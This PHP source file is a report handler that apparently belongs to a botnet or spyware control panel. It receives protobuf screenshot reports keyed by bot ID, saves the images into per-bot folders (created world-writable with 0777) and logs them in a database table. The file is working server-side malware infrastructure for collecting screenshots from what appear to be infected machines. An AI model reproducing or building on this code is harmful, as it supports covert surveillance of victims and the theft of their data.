<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';
require_once 'application/modules/MimeTypes.php';

class ReportScreenshotHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
        $reportScreenshot = new reportScreenshot();
        $reportScreenshot->ParseFromString($input_data);
        $this->data = $reportScreenshot->getAssocArray();
        $this->data['botid'] = $botid;
        $this->data['bot_id'] = $this->getRowIdByBotId($botid);
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                return false;
            }

            $data = array();
            $filename = REPORTS_DIRECTORY . $this->data['botid'] . DIRECTORY_SEPARATOR . 'screenshots' . DIRECTORY_SEPARATOR . 'screenshot_' . millitime() . '.';
            $extension = MIME_TO_EXT[$this->data['mimeType']];

            if (empty($extension)) {
                $filename .= 'none';
            } else {
                $filename .= $extension;
            }

            $data['bot_id'] = $this->data['bot_id'];
            $data['path'] = $filename;

            if (!empty($this->data['description'])) {
                $data['description'] = $this->data['description'];
            }

            if (!file_exists(dirname($filename)) && !mkdir($concurrentDirectory = dirname($filename), 0777, true) && !is_dir($concurrentDirectory)) {
                Logger::Error('ReportScreenshotHandler', 'storeDataToServer (exception)', 'Directory '.$concurrentDirectory.' was not created');
                return false;
            }
            file_put_contents($filename, $this->data['data']);

            $insertedId = $this->getDB()->insert('reports_screenshots', $data);

            if ($insertedId < 1)
            {
                return false;
            }
        }
        catch(Exception $e)
        {
            Logger::Error('ReportScreenshotHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
        return true;
    }

    protected function dataIsEmpty()
    {
        if (empty($this->data['mimeType']) || empty($this->data['data']))
            return true;
        return false;
    }
}